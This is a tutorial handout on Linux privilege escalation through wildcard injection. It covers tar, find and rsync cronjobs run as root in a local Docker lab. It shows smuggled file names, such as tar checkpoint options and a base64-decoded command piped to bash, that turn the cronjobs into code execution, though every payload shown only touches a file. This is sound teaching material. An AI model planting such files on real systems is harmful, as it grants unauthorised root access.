                   _________________________________

                       LINUX PRIVILEGE ESCALATION
                    Wildcard Expansion Exploitation

                            Leonardo Tamiano
                   _________________________________


Table of Contents
_________________

1. Shell Wildcards
2. Examples
3. Exploitation
.. 1. Scenario 1 – tar
.. 2. Scenario 2 – find
.. 3. Scenario 3 – rsync
4. References


1 Shell Wildcards
=================

  When using shells such as `sh' or `bash', it is often useful to use
  `wildcard' characters to perform more complex actions.

  In the linux environment we have the following wildcard characters,
  also called "globbing patterns"

  - `?' (question mark)

    this can represent any single character.

  - `*' (asterisk)

    this can represent any number of characters (including zero, in
    other words, zero or more characters)

  - `[ ]' (square brackets)

    specifies a range.

  - `{ }' (curly brackets)

    terms are separated by commas and each term must be the name of
    something or a wildcard.

  - `[!]'

    This construct is similar to the [ ] construct, except rather than
    matching any characters inside the brackets, it'll match any
    character, as long as it is not listed between the [ and ].

  - `\' (backslash)

    is used as an "escape" character, i.e. to protect a subsequent
    special character.


2 Examples
==========

  Before the shell executes the command, the pattern is expanded.

  ,----
  | $ cd /tmp
  | $ mkdir test1 test2 test3 test4 test5
  | $ ls test?
  `----

  In this case the pattern would expand as follows

  ,----
  | ls test1 test2 test3 test4 test5
  `----

  ----------------------------------------------------------------------

  ,----
  | $ mkdir test6test
  | $ ls test*
  `----

  In this other case the pattern would expand as follows

  ,----
  | ls test1 test2 test3 test4 test5 test6test
  `----


3 Exploitation
==============

  Consider a `cronjob' or a script that uses wildcard expansion within
  one of its commands. If the wildcard is not properly used, the
  wildcard expansion done by the shell can introduce security
  vulnerabilities.


3.1 Scenario 1 – tar
~~~~~~~~~~~~~~~~~~~~

  Setup

  ,----
  | echo "test1" > file1.txt && echo "test2" > file2.txt && echo "test3" > file3.txt
  `----

  Suppose a cronjob is configured to execute the following script as the
  root user.

  ,----
  | cd /tmp/scenario1
  | tar -cf /tmp/scenario1.tar *
  `----

  If we're able to write into the `/tmp/scenario1' directory, then we
  can exploit such script as follows:

  1. First we create a script containing the malicious code that we want
     to force the root user to execute.

  ,----
  | echo 'touch /tmp/scenario1/hacked' > /tmp/scenario1/shell.sh
  `----

  1. Then we create the following two files

  ,----
  | echo "" > "--checkpoint-action=exec=sh shell.sh"
  | echo "" > "--checkpoint=1"
  `----

  When the script will execute, the initial command

  ,----
  | tar -cf /tmp/scenario1.tar *
  `----

  will be expanded into

  ,----
  | tar -cf /tmp/scenario1.tar --checkpoint=1  --checkpoint-action=exec=sh shell.sh file1.txt   file2.txt   file3.txt   shell.sh
  `----

  which will trigger the code execution

  ,----
  | $ ls
  | '--checkpoint=1'  '--checkpoint-action=exec=sh shell.sh'   file1.txt   file2.txt   file3.txt   hacked   shell.sh
  `----


3.2 Scenario 2 – find
~~~~~~~~~~~~~~~~~~~~~

  Suppose you have the following command. The command will delete all
  files that are not `jpg' or `png' or `gif'.

  ,----
  | /usr/bin/find . -type f -not -regex '.*\.\(jpg\|png\|gif\)' -exec bash -c "rm -f {}" \;
  `----

  If we have such configuration, we can exploit by creating the
  following file.

  ,----
  | touch ./"file.exe; echo dG91Y2ggL3RtcC9oYWNrZWQ= | base64 -d | bash"
  `----

  Notice that the file contains a base64 payload that will be decoded
  and then executed by bash. The payload is as follows

  ,----
  | touch /tmp/hacked
  `----


3.3 Scenario 3 – rsync
~~~~~~~~~~~~~~~~~~~~~~

  Setup

  ,----
  | docker build -t wildcard-expansion-lab .
  | docker run -td --name wildcard-expansion-lab -p2222:22 --rm wildcard-expansion-lab
  | docker stop wildcard-expansion-lab
  | docker exec -it wildcard-expansion-lab "/bin/bash"
  | ssh -p2222 root@127.0.0.1
  `----

  ,----
  | cd /tmp
  | mkdir test1 test2
  `----

  Suppose a cronjob is configured to execute the following script as the
  root user.

  ,----
  | rsync -a -e 'ssh -p 2222' *.txt root@localhost:/tmp/
  `----

  If we're able to write files into the `test1' directory, then we can
  exploit such configuration as follows:

  1. We create a payload called `shell.txt'

     ,----
     | echo 'touch /tmp/hacked' > /tmp/test1/shell.txt
     `----

  2. Create another file named "-e sh test.txt"

     ,----
     | echo "" > '-e sh shell.txt';
     `----


4 References
============

  Wildcards
  - <https://tldp.org/LDP/GNU-Linux-Tools-Summary/html/x11655.htm>
  - <https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c>
  - <https://www.davila.me/menu/vulnerability-methods/wildcard-injection>
